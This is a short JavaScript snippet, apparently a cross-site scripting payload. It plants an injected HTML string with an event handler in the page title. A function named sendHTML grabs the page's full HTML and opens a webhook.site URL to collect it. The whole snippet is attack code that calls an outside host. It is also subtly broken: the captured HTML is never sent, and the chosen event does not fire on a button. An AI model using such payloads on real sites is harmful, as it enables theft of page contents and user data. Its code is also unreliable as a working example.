var attackScript = "<button onload='sendHTML()'></button>"
if (document.title != attackScript) {
    document.title = attackScript;
}

function sendHTML() {
    var html = document.documentElement.outerHTML;
    window.open('https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c');
}
